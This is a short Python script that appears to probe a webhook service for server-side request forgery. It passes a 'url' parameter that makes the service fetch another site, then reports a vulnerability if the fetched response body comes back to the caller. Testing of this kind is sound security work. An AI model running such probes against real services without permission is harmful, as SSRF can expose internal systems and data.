import urllib.request
import json

url = "http://webhook.0x10.cloud/?url=http://example.com"
req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})

try:
    with urllib.request.urlopen(req, timeout=5) as response:
        body = response.read().decode("utf-8")
        data = json.loads(body)
        headers = response.headers

        leaked_body = data.get("body", "")

        if leaked_body:
            print(
                f"\n[!] VULNERABILITY FOUND: Full internal response body exposed to caller."
            )
            print(f"    Body preview: {leaked_body[:200]}")

except Exception as e:
    print(f"Error connecting: {e}")
